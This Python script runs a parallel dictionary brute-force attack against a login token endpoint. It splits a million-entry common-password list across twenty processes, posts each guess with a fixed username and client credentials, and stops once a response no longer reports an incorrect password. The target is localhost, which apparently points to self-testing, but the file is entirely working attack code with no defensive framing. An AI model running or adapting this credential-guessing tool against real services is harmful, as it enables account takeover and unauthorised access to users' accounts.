import multiprocessing as mp
import time
import pandas as pd
import requests as r

filename = '10-million-password-list-top-1000000.txt'
url = "http://127.0.0.1:8000/token"
headers = {
  'accept': 'application/json',
  'Content-Type': 'application/x-www-form-urlencoded'
}


def read_chunk(filename, start_line, num_lines):
    df = pd.read_csv(filename, skiprows=range(1, start_line + 1), nrows=num_lines, header=None)
    return df[0].tolist()


def process_data(start_line, num_lines, result_queue, stop_event):
    lines = read_chunk(filename, start_line, num_lines)
    for line in lines:
        if stop_event.is_set():
            break
        l = str(line).strip()
        payload = f"grant_type=&username=d8M6O79mNK&password={l}&scope=&client_id=6779ef20e75817b79602&client_secret=ZYDPLLBWSK3MVZYDPLLBWLLBWSK3MVZYDPLLBWSK3MVQJSIYHB1OR2JSK3MVQJSIYHB1OR2JXC"
        response = r.request("POST", url, headers=headers, data=payload)
        if not ("Incorrect username or password" in response.text):
            print(f"==Credential valid: uid=d8M6O79mNK password={l}==")
            stop_event.set()
            break
        elif "Incorrect username or password" in response.text:
            print(f"{l} ", flush=True, end="")
        elif "Max retries exceeded with url" in response.text:
            print("Max retries exceeded with url", flush=True, end="")
    result_queue.put(lines)


def main():
    num_lines_per_process = 500_000
    total_lines = 10_000_000
    num_processes = total_lines // num_lines_per_process

    processes = []
    result_queue = mp.Queue()
    stop_event = mp.Event()

    for i in range(num_processes):
        start_line = i * num_lines_per_process
        p = mp.Process(target=process_data, args=(start_line, num_lines_per_process, result_queue, stop_event))
        processes.append(p)
        p.start()

    results = []
    for _ in range(num_processes):
        results.extend(result_queue.get())

    for p in processes:
        p.join()

    print("Total lines read:", len(results))


if __name__ == '__main__':
    start_time = time.time()
    main()
    end_time = time.time()
    print(f"Total execution time: {end_time - start_time} seconds")
